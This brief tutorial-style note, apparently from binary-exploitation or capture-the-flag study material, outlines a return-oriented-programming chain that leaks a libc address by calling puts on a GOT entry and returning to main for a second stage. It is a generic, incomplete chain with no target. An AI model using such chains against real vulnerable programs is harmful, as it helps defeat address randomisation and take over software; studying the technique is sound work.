# The leak chain — the full recipe


The complete puts(got[x]) leak:

    pop rdi ; got_x
    puts@plt
    main_addr            # restart for stage 2

## The print

The puts output = the resolved libc address's bytes — unpack them.
